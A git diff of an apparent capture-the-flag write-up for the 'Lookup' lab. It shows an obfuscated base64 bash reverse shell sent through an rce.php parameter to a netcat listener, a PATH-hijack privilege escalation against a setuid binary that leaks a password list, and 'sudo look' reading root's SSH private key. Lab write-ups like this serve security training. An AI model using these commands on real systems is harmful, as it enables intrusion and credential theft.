@@ -208,7 +208,7 @@ Set a Netcat
 [ Oguri ~/Desktop/CTF/Lookup ]$ nc -lvnp 9001
 Listening on 0.0.0.0 9001
 ```
-Use it at web like that:
+Now let's try to launch "rce" on the page in the browser:
 ```
 http://files.lookup.thm/rce.php?cmd=echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM4LjkvOTAwMSAwPiYxCg==' | base64 -d | bash
 ```
@@ -244,7 +244,8 @@ s: command not found
 <var/www/files.lookup.thm/public_html/elFinder/php$ cd /home
 www-data@ip-10-80-132-187:/home$ 
 ```
-
+In order to identify potential privilege escalation vectors, I scanned the system for files with the SUID bit set.
+The command returns all binaries that run with owner privileges (usually root) that may be vulnerable to abuse according to GTFOBins.
 ```
 www-data@ip-10-80-132-187:/home/think$ find / -perm /4000 2>/dev/null
 /snap/snapd/19457/usr/lib/snapd/snap-confine
@@ -278,7 +279,6 @@ www-data@ip-10-80-132-187:/home/think$ find / -perm /4000 2>/dev/null
 ^C
 ```
 
-
 ```
 www-data@ip-10-80-132-187:/usr/sbin$ file /usr/sbin/pwm
 /usr/sbin/pwm: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01ec8570b00af8889beebc5f93c6d56fb9cc1083, for GNU/Linux 3.2.0, not stripped
@@ -289,7 +289,7 @@ www-data@ip-10-80-132-187:/usr/sbin$ pwm
 www-data@ip-10-80-132-187:/usr/sbin$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-
+When the program was launched, it executed the id command without specifying the full path, which allowed for a PATH hijacking attack. By creating a malicious version of the id and modifying the PATH variable, you can get the commands to be executed as root:
 ```
 www-data@ip-10-80-132-187:/usr/sbin$ cd /tmp
 www-data@ip-10-80-132-187:/tmp$ echo 'echo "uid=1000(think)"' > id
@@ -304,7 +304,7 @@ www-data@ip-10-80-132-187:/tmp$ echo $PATH
 www-data@ip-10-80-132-187:/tmp$ id
 uid=1000(think)
 ```
-
+Output:
 ```
 www-data@ip-10-80-132-187:/tmp$ pwm
 [!] Running 'id' command to extract the username and user ID (UID)
@@ -359,7 +359,8 @@ jose.96.
 jose.9298
 jose.2856171
 ```
-
+One of these slogans stands out strongly, and for good reason,
+and like that we finally can login to "think"
 ```
 www-data@ip-10-80-132-187:/tmp$ su think
 Password: 
@@ -370,7 +371,8 @@ think@ip-10-80-132-187:~$ cat user.txt
 XXX
 ```
 ## Exploitation Root
-
+The look program allows you to read any file if you pass an empty prefix:
+https://gtfobins.github.io/gtfobins/look/
 ```
 think@ip-10-80-132-187:~$ sudo look '' /root/.ssh/id_rsa
 [sudo] password for think: 
